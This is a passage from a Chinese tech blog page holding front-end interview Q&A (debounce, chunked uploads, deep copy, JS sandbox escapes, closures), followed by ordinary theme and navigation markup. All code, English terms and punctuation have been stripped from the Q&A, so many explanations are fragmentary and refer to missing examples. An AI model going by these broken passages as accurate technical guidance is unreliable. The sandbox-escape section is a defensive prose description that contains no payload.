待条件存在一种进程的循环链链中的每一个进程已获得的资源同时被链中的下一个进程所请求在发生死锁时必然存在一个进程资源的环形链解决办法只要打破四个必要条件之一就能有效预防死锁的发生面向对象的三个特征分别说一下什么意思参考答案概念封装将对象运行所需的资源封装在程序对象中基本上是方法和数据对象是公布其接口其他附加到这些接口上的对象不需要关心对象实现的方法即可使用这个对象这个概念就是不要告诉我你是怎么做的只要做就可以了对象可以看作是一个自我包含的原子对象接口包括了公共的方法和初始化数据继承继承可以解决代码复用让编程更加靠近人类思维当多个类存在相同的属性变量和方法时可以从这些类中抽象出父类在父类中定义这些相同的属性和方法所有的子类不需要重新定义这些属性和方法只需要通过继承父类中的属性和方法多态多态是指一个引用类型在不同情况下的多种状态也可以理解成多态是指通过指向父类的引用来调用在不同子类中实现的方法特点封装可以隐藏实现细节使得代码模块化继承可以扩展已存在的代码模块类它们的目的都是为了代码重用多态就是相同的事物调用其相同的方法参数也相同时但表现的行为却不同多态分为两种一种是行为多态与对象的多态防抖和节流的原理和使用场景参考答案函数防抖和函数节流优化高频率执行代码的一种手段中的一些事件如浏览器的鼠标的输入框的等事件在触发时会不断地调用绑定在事件上的回调函数极大地浪费资源降低前端性能为了优化体验需要对这类事件进行调用次数的限制防抖在事件被触发秒后再执行回调如果在这秒内又被触发则重新计时根据函数防抖思路设计出第一版的最简单的防抖代码维护同一个上面例子中的就是防抖函数在中鼠标移动的时候会在最后触发的后执行回调函数如果我们一直在浏览器中移动鼠标比如会发现会在后才会执行函数因为这个就是函数防抖在上面的代码中会出现一个问题只能在的父级作用域中这样才是同一个并且为了方便防抖函数的调用和回调函数的传参问题我们应该用闭包来解决这些问题优化后的代码维护一个取执行作用域的用指向调用的对象相当于使用闭包后解决传参和封装防抖函数的问题这样就可以在其他地方随便将需要防抖的函数传入了节流每隔一段时间只执行一次函数定时器实现节流函数在后执行完之后清空此时为假触发可以进入计时器时间戳实现节流函数使用闭包返回一个函数并且用到闭包函数外面的变量异同比较相同点都可以通过使用实现目的都是降低回调执行频率节省计算资源不同点函数防抖在一段连续操作结束后处理回调利用和实现函数节流在一段连续操作中每一段时间只执行一次频率较高的事件中使用来提高性能函数防抖关注一定时间连续触发的事件只在最后执行一次而函数节流侧重于一段时间内只执行一次常见应用场景函数防抖的应用场景连续的事件只需触发一次回调的场景有搜索框搜索输入只需用户最后一次输入完再发送请求手机号邮箱验证输入检测窗口大小只需窗口调整完成后计算窗口大小防止重复渲染函数节流的应用场景间隔一段时间执行一次回调的场景有滚动加载加载更多或滚到底部监听谷歌搜索框搜索联想功能高频点击提交表单重复提交文件异步上传怎么实现参考答案普通表单上传使用来展示常规的表单上传是一个不错的选择首先构建文件上传的表单并指定表单的提交内容类型为表明表单需要上传二进制数据然后编写上传文件接收代码使用方法即可大法好移动上传文件至指定文件夹下并根据返回值判断操作是否成功表单上传大文件时很容易遇见服务器超时的问题通过前端也可以进行异步上传文件的操作一般由两个思路文件编码上传第一个思路是将文件进行编码然后在服务端进行解码之前写过一篇在前端实现图片压缩上传的博客其主要实现原理就是将图片转换成进行传递获取图片的编码然后将图片当做是一个很长的字符串进行传递在服务端需要做的事情也比较简单首先解码然后保存图片即可编码的缺点在于其体积比原图片更大因为将三个字节转化成四个字节因此编码后的文本会比原文本大出三分之一左右对于体积很大的文件来说上传和解析的时间会明显增加更多关于的知识可以参考笔记除了进行编码还可以在前端直接读取文件内容后以二进制格式上传读取二进制文件读取或直接上传把从里读取的文件内容放到的字段里异步上传对象主要用来组装一组用发送请求的键值对可以更加灵活地发送请求可以使用来模拟表单提交获取的对象服务端处理方式与直接表单请求基本相同无刷新页面在低版本的浏览器如上是不支持直接上传的因此只能用来上传文件而提交本身会进行页面跳转这是因为表单的属性导致的其取值有默认值在相同的窗口中打开响应页面在新窗口打开在父窗口打开在最顶层的窗口打开在指定名字的中打开如果需要让用户体验异步上传文件的感觉可以通过指定来实现把的属性设置为一个看不见的那么返回的数据就会被这个接受因此只有该会被刷新至于返回结果也可以通过解析这个内的文本来获取扩展大文件上传现在来看看在上面提到的几种上传方式中实现大文件上传会遇见的超时问题表单上传和无刷新页面上传实际上都是通过标签进行上传文件这种方式将整个请求完全交给浏览器处理当上传大文件时可能会遇见请求超时的情形通过其实际也是在中封装一组请求参数用来模拟表单请求无法避免大文件上传超时的问题编码上传我们可以比较灵活地控制上传的内容大文件上传最主要的问题就在于在同一个请求中要上传大量的数据导致整个过程会比较漫长且失败后需要重头开始上传试想如果我们将这个请求拆分成多个请求每个请求的时间就会缩短且如果某个请求失败只需要重新发送这一次请求即可无需从头开始这样是否可以解决大文件上传的问题呢综合上面的问题看来大文件上传需要实现下面几个需求支持拆分上传请求即切片支持断点续传支持显示上传进度和暂停上传接下来让我们依次实现这些功能看起来最主要的功能应该就是切片了文件切片编码方式上传中在前端我们只要先获取文件的二进制内容然后对其内容进行拆分最后将每个切片上传到服务端即可在中文件对象是对象的子类对象包含一个重要的方法通过这个方法我们就可以对二进制文件进行拆分下面是一个拆分文件的示例文件总大小每次上传的开始字节每次上传的结尾字节根据长度截取每次需要上传的数据对象继承自对象因此包含方法将文件拆分成大小的分块然后每次请求只需要上传这一个部分的分块即可首先拆分切片服务器接收到这些切片后再将他们拼接起来就可以了下面是拼接切片的示例代码确定上传的文件名第一次上传时没有文件就创建文件此后上传只需要把数据追加到此文件中测试时记得修改的配置否则大文件可能会提示的错误上面这种方式来存在一些问题无法识别一个切片是属于哪一个切片的当同时发生多个请求时追加的文件内容会出错切片上传接口是异步的无法保证服务器接收到的切片是按照请求顺序拼接的因此接下来我们来看看应该如何在服务端还原切片还原切片在后端需要将多个相同文件的切片还原成一个文件上面这种处理切片的做法存在下面几个问题如何识别多个切片是来自于同一个文件的这个可以在每个切片请求上传递一个相同文件的参数如何将多个切片还原成一个文件确认所有切片都已上传这个可以通过客户端在切片全部上传后调用接口来通知服务端进行拼接找到同一个下的所有切片确认每个切片的顺序这个可以在每个切片上标记一个位置索引值按顺序拼接切片还原成文件上面有一个重要的参数即我们需要获取为一个文件的唯一标识可以通过下面两种方式获取根据文件名文件长度等基本信息进行拼接为了避免多个用户上传相同的文件可以再额外拼接用户信息如等保证唯一性根据文件的二进制内容计算文件的这样只要文件内容不一样则标识也会不一样缺点在于计算量比较大修改上传代码增加相关参数获取同一个文件会返回相同的值获取对于同一个文件获取其的传递传递切片索引值所有切片上传完毕后调用接口在接口中我们通过来保存同一个文件相关的切片把同一个文件的切片放在相同的目录下除了上面这种简单通过目录区分切片的方法之外还可以将切片信息保存在数据库来进行索引接下来是接口的实现这个接口会在所有切片上传后调用合并后的文件名读取单个切块将切块合并到一个文件上这样就解决了上面的两个问题识别切片来源保证切片拼接顺序断点续传即使将大文件拆分成切片上传我们仍需等待所有切片上传完毕在等待过程中可能发生一系列导致部分切片上传失败的情形如网络故障页面关闭等由于切片未全部上传因此无法通知服务端合成文件这种情况下可以通过断点续传来进行处理断点续传指的是可以从已经上传部分开始继续上传未完成的部分而没有必要从头开始上传节省上传时间由于整个上传过程是按切片维度进行的且接口是在所有切片上传完成后由客户端主动调用的因此断点续传的实现也十分简单在切片上传成功后保存已上传的切片信息当下次传输相同文件时遍历切片列表只选择未上传的切片进行上传所有切片上传完毕后再调用接口通知服务端进行文件合并因此问题就落在了如何保存已上传切片的信息了保存一般有两种策略可以通过等方式保存在前端浏览器中这种方式不依赖于服务端实现起来也比较方便缺点在于如果用户清除了本地文件会导致上传记录丢失服务端本身知道哪些切片已经上传因此可以由服务端额外提供一个根据文件查询已上传切片的接口在上传文件前调用该文件的历史上传记录下面让我们通过在本地保存已上传切片记录来实现断点上传的功能获取已上传切片记录保存已上传切片然后对上传逻辑稍作修改主要是增加上传前检测是已经上传上传后保存记录的逻辑获取上传记录已上传的切片则不再重新上传上传成功后保存已上传切片记录此时上传时刷新页面或者关闭浏览器再次上传相同文件时之前已经上传成功的切片就不会再重新上传了服务端实现断点续传的逻辑基本相似只要在内部调用服务端的查询接口获取已上传切片的记录即可因此这里不再展开此外断点续传还需要考虑切片过期的情况如果调用了接口则磁盘上的切片内容就可以清除掉了如果客户端一直不调用的接口放任这些切片一直保存在磁盘显然是不可靠的一般情况下切片上传都有一段时间的有效期超过该有效期就会被清除掉基于上述原因断点续传也必须同步切片过期的实现逻辑上传进度和暂停通过中的方法可以实现监控每一个切片上传进度上传暂停的实现也比较简单通过可以取消当前未完成上传切片的上传实现上传暂停的效果恢复上传就跟断点续传类似先获取已上传的切片列表然后重新发送未上传的切片由于篇幅关系上传进度和暂停的功能这里就先不实现了使用请求实时数据返回顺序不一致怎么解决参考答案场景上面的程序会每隔秒向服务器请求一次数据并在数据到达后存储这个实现方法通常可以满足简单的需求然而同时也存在着很大的缺陷在网络情况不稳定的情况下服务器从接收请求发送请求到客户端接收请求的总时间有可能超过秒而请求是以秒间隔发送的这样会导致接收的数据到达先后顺序与发送顺序不一致解决方案使用代替程序首先设置秒后发起请求当数据返回后再隔秒发起第二次请求以此类推这样的话虽然无法保证两次请求之间的时间间隔为固定值但是可以保证到达数据的顺序发起下一次请求协议本质上是一个基于的协议为了建立一个连接客户端浏览器首先要向服务器发起一个请求这个请求和通常的请求不同包含了一些附加头信息其中附加头信息表明这是一个申请协议升级的请求服务器端解析这些附加的头信息然后产生应答信息返回给客户端客户端和服务器端的连接就建立起来了双方就可以通过这个连接通道自由的传递信息并且这个连接会持续存在直到客户端或者服务器端的某一方主动的关闭连接服务器客户端同样可以使用或者是浏览器实现这里选用浏览器作为客户端为客户端的原生对象浅拷贝深拷贝实现方式参考答案浅拷贝和深拷贝都只针对于引用数据类型浅拷贝只复制指向某个对象的指针而不复制对象本身新旧对象还是共享同一块内存但深拷贝会另外创造一个一模一样的对象新对象跟原对象不共享内存修改新对象不会改到原对象区别浅拷贝只复制对象的第一层属性深拷贝可以对对象的属性进行递归复制实现浅拷贝方法方法方法只复制第一层的浅拷贝实现深拷贝方法采用递归去拷贝所有层级属性判断子元素是否为对象如果是递归复制如果不是简单复制使用和实现深拷贝把对象转成字符串再用把字符串转成新的对象热门的函数库也有提供用来做深拷贝获取当前页面参考答案设置或获取整个为字符串返回设置或获取的协议部分返回设置或获取的主机部分返回设置或获取与关联的端口号码返回空字符如果采用默认的端口即使添加了那么返回值并不是默认的而是空字符设置或获取与的路径部分就是文件地址返回设置或获取属性中跟在问号后面的部分返回获得查询参数部分除了给动态语言赋值以外我们同样可以给静态页面并使用来获得相信应的参数值设置或获取属性中在井号后面的分段返回空字符因为中没有获取中的参数值正则法这样调用参数名参数名参数名拆分法获取中符后的字串参数参数参数参数参数参数参数参数参数参数参数参数指定取比如说一个我们想得到参数的值可以通过以下函数调用获取中符后的字符串并正则匹配单个参数的获取方法获取中符后的字串判断是否有参数从第一个字符开始因为第个是号获取所有除问号的所有符串用等号进行分隔因为知道只有一个参数所以直接用等号进分隔如果有多个参数要用号分隔再用等号进行分隔直接弹出第一个参数如果有多个参数还要进行循环的中两个数组怎么取交集差集并集补集交集并集补集交集并集沙箱隔离怎么做的什么原理参考答案沙箱即顾名思义就是让你的程序跑在一个隔离的环境下不对外界的其他程序造成影响通过创建类似沙盒的独立作业环境在其内部运行的程序并不能对硬盘产生永久性的影响实现沙箱的三种方法借助首先从最简陋的方法说起假如你想要通过和直接执行一段代码这是不现实的因为代码内部可以沿着作用域链往上找篡改全局变量这是我们不希望的所以你需要让沙箱内的变量访问都在你的监控范围内不过你可以使用在的块级作用域下变量访问会优先查找你传入的参数对象之后再往上找所以相当于你变相监控到了代码中的变量访问接下里你要做的是就是暴露可以被访问的变量以及阻断沙箱内的对外访问通过提供的特性可以获取到对对象上的所有改写绑定防止访问通过设置函数可以监听到变量的访问在上述代码中仅暴露个别外部变量供代码访问其余不存在的属性都会直接抛出其实还存在函数但是如果和函数只能拦截到当前对象属性的操作对外部变量属性的读写操作无法监听到所以只能使用函数了接下来我们测试一下看起来一切似乎没有什么问题但是问题出在了传入的对象当调用的是的时候方法是无法监听到对属性的访问的假设所执行的代码是不可信的这时候它只需要通过就可以访问到构造函数的原型对象再对原型对象进行一些篡改例如将就能影响到外部的代码逻辑的例如上面所展示的代码通过访问原型链的方式实现了沙箱逃逸并且篡改了原型链上的方法一旦外部的代码执行了方法就可以实现攻击注入第三方代码由于在内部定义执行的函数代码逻辑仍然会沿着作用于链查找为了绕开作用域链的查找笔者通过访问箭头函数的的方式拿到了构造函数这个时候内所执行的代码在执行的时候便不会再沿着作用域链往上找而是直接在全局作用域下执行通过这样的方式实现了沙箱逃逸以及攻击你可能会想如果我切断原型链的访问是否就杜绝了呢的确你可以通过的方式传入一个不含有原型链的对象并且让暴露的对象只有一层不传入嵌套的对象但是即使是基本类型值数字或字符串同样也可以通过查找到原型链而且即使不传入对象你还可以通过下面这种方式绕过可见的这种沙箱方式防君子不防小人当然你也可以通过对传入的代码做代码分析或过滤假如传入的代码不是按照的规定的数据格式例如就直接抛出错误阻止恶意代码注入但这始终不是一种安全的做法借助实现沙箱前面介绍一种劣质的不怎么安全的方法构造了一个简单的沙箱但是在前端最常见的方法还是利用来构造一个沙箱但是这也会带来一些限制脚本不能执行不能发送请求不能使用本地存储即等不能创建新的弹窗和不能发送表单不能加载额外插件比如等不过别方你可以对这个标签进行一些配置接下里你只需要结合将你需要执行的代码和需要暴露的数据传递过去然后和你的页面通信就行了需要注意的是在子页面中要注意不要让执行代码访问到对象因为你需要调用的给父页面传递信息假如恶意代码也获取到了对象相当于就拿到了父页面的控制权了这个时候可大事不妙当使用的时候由于的默认为需要设置允许两个页面进行通信意味着子页面内可以发起请求这时候需要防范好允许了同域请求不过好在并没有携带上当调用传递数据给子页面的时候传输的数据对象本身已经通过结构化克隆算法复制简单的说通过传递的对象已经由浏览器处理过了原型链已经被切断同时传过去的对象也是复制好了的占用的是不同的内存空间两者互不影响所以你不需要担心出现第一种沙箱做法中出现的问题中的沙箱中使用沙箱很简单只需要利用原生的模块便可以快速创建沙箱同时指定上下文中提供了三个方法三者的用法有个别出入比较常用的是和可以传入参数指定好上下文对象但是是绝对安全的吗不一定通过上面这段代码我们可以通过停止掉主进程导致程序不能继续往下执行这是我们不希望的解决方案是绑定好上下文对象同时为了避免通过原型链逃逸中的对象并没有像浏览器端一样进行结构化复制导致原型链依然保留所以我们需要切断原型链同时对于传入的暴露对象只提供基本类型值上不能包含引用类型的属性让我们来看一下中是怎么使用的沙堆通过返回沙箱中的构造函数同时传入切断原型链的空对象防止逃逸之后再外部使用的时候只需要调用返回的这个函数和普通的一样调用即可闭包的理解参考答案闭包一个函数和对其周围状态词法环境的引用捆绑在一起或者说函数被引用包围这样的组合就是闭包也就是说闭包让你可以在一个内层函数中访问到其外层函数的作用域在中每当创建一个函数闭包就会在函数创建的同时被创建出来闭包的特点让外部访问函数内部变量成为可能可以避免使用全局变量防止全局变量污染可以让局部变量常驻在内存中会造成内存泄漏有一块内存空间被长期占用而不被释放应用场景埋点是网站分析的一种常用的数据采集方法计数器点击加入购物车次数点击付款次数事件循环按照以下方式添加事件打印出来的不是按照序号的形成原因就是操作的是同一个词法环境因为后面的函数都是一个闭包但是操作的是同一个词法环境解决办法使用匿名函数之后就形成一个闭包操作的就是不同的词法环境应用篇字符串中的单词逆序输出手写生成长度是且在内不重复的整数随机数组参考答案把考点拆成了个小项需要用递归算法实现生成一个长度为的空数组生成一个之间的随机整数把随机数插入到数组内如果数组内已存在与相同的数字则重新生成随机数并插入到内需要使用递归实现不能使用等循环最终输出一个长度为且内容不重复的数组产生一个之间的随机数返回指定范围的随机数之间的公式或者实现一个数组对象的去重相同的只保留最后一个最好有多个思路参考答案遍历数组法它是最简单的数组去重方法方法实现思路新建一个数组遍历去要重的数组当值不在新数组的时候为就加入该新数组中数组下标判断法调用方法性能和方法差不多实现思路如果当前数组的第项在当前数组中第一次出现的位置不是那么表示第项是重复的忽略掉否则存入结果数组排序后相邻去除法实现思路给传入的数组排序排序后相同的值会相邻然后遍历排序后数组时新数组只加入不与前一值重复的值优化遍历数组法推荐实现思路双层循环外循环表示从到内循环表示从到将没重复的右边值放入新数组检测到有重复值时终止当前循环同时进入外层循环的下一轮判断实现基本思路提供了新的数据结构它类似于数组但是成员的值都是唯一的没有重复的值函数可以接受一个数组或类似数组的对象作为参数用来初始化扩展如果重复则去掉该元素数组下标去重传入返回增加了扩展运算符用于取出参数对象的所有可遍历属性拷贝到当前对象之中我们用这种方法只可以扁平一层但是顺着这个方法一直思考我们可以写出这样的方法方法用正则和非正则实现写一个判断是否是空对象的函数参考答案给定一个字符串请你找出其中不含有重复字符的最长子串的长度三数之和参考答案题目描述给定一个包含个整数的数组判断中是否存在三个元素使得找出所有满足条件且不重复的三元组注意答案中不可以包含重复的三元组例如给定数组满足要求的三元组集合为判断数据类型作为的新特性只要调用该方法便可以简单快速实现数组的扁平化使用起来确实很容易上手可以说是门槛但是只会这个方法是没有办法得到面试官的青睐的自动展开',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-10-14 14:35:32',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.1.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.kifroom.icu/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/ico.png" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://kifnav.kifroom.icu/" title="kifNav"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://kifnav.kifroom.icu/favicon.ico" alt="kifNav"/><span class="back-menu-item-text">kifNav</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">Kifroom</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/links/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/message-board/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button only-home" id="travellings_button" title="随机前往一个开往项目网站"><a class="site-page" onclick="anzhiyu.totraveling()" title="随机前往一个开往项目网站" href="javascript:void(0);" rel="external nofollow" data-pjax-state="external"><i class="anzhiyufont anzhiyu-icon-train"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Axios/" style="font-size: 1.05rem;">Axios<sup>3</sup></a><a href="/tags/C-S-N/" style="font-size: 1.05rem;">C.S.N<sup>1</sup></a><a href="/tags/Ckeditor4/" style="font-size: 1.05rem;">Ckeditor4<sup>1</sup></a><a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.05rem;">C语言<sup>3</sup></a><a href="/tags/Django/" style="font-size: 1.05rem;">Django<sup>1</sup></a><a href="/tags/Excel/" style="font-size: 1.05rem;">Excel<sup>1</sup></a><a href="/tags/Oracle/" style="font-size: 1.05rem;">Oracle<sup>1</sup></a><a href="/tags/Python/" style="font-size: 1.05rem;">Python<sup>1</sup></a><a href="/tags/RSA/" style="font-size: 1.05rem;">RSA<sup>1</sup></a><a href="/tags/SQL/" style="font-size: 1.05rem;">SQL<sup>1</sup></a><a href="/tags/VS-code/" style="font-size: 1.05rem;">VS code<sup>1</sup></a><a href="/tags/Vue-js/" style="font-size: 1.05rem;">Vue.js<sup>2</sup></a><a href="/tags/Win/" style="font-size: 1.05rem;">Win<sup>3</sup></a><a href="/tags/dom-to-image/" style="font-size: 1.05rem;">dom-to-image<sup>1</sup></a><a href="/tags/express/" style="font-size: 1.05rem;">express<sup>1</sup></a><a href="/tags/git/" style="font-size: 1.05rem;">git<sup>1</sup></a><a href="/tags/hexo/" style="font-size: 1.05rem;">hexo<sup>5</sup></a><a href="/tags/javascript/" style="font-size: 1.05rem;">javascript<sup>7</sup></a><a href="/tags/kali/" style="font-size: 1.05rem;">kali<sup>1</sup></a><a href="/tags/leetcode/" style="font-size: 1.05rem;">leetcode<sup>1</sup></a><a href="/tags/lerna/" style="font-size: 1.05rem;">lerna<sup>1</sup></a><a href="/tags/linux/" style="font-size: 1.05rem;">linux<sup>1</sup></a><a href="/tags/matery/" style="font-size: 1.05rem;">matery<sup>2</sup></a><a href="/tags/monorepo/" style="font-size: 1.05rem;">monorepo<sup>1</sup></a><a href="/tags/node-js/" style="font-size: 1.05rem;">node.js<sup>2</sup></a><a href="/tags/pinia/" style="font-size: 1.05rem;">pinia<sup>1</sup></a><a href="/tags/pyqt/" style="font-size: 1.05rem;">pyqt<sup>1</sup></a><a href="/tags/this/" style="font-size: 1.05rem;">this<sup>1</sup></a><a href="/tags/vite/" style="font-size: 1.05rem;">vite<sup>2</sup></a><a href="/tags/vue3/" style="font-size: 1.05rem;">vue3<sup>3</sup></a><a href="/tags/webpack/" style="font-size: 1.05rem;">webpack<sup>1</sup></a><a href="/tags/workspace/" style="font-size: 1.05rem;">workspace<sup>1</sup></a><a href="/tags/%E5%85%BC%E5%AE%B9%E6%80%A7/" style="font-size: 1.05rem;">兼容性<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 1.05rem;">前端<sup>1</sup></a><a href="/tags/%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83/" style="font-size: 1.05rem;">开发规范<sup>2</sup></a><a href="/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/" style="font-size: 1.05rem;">微信小程序<sup>4</sup></a><a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 1.05rem;">操作系统<sup>3</sup></a><a href="/tags/%E6%95%B0%E7%BB%84/" style="font-size: 1.05rem;">数组<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%AB%99%E4%BE%BF%E7%AD%BE/" style="font-size: 1.05rem;">网站便签<sup>1</sup></a><a href="/tags/%E9%9D%A2%E8%AF%95/" style="font-size: 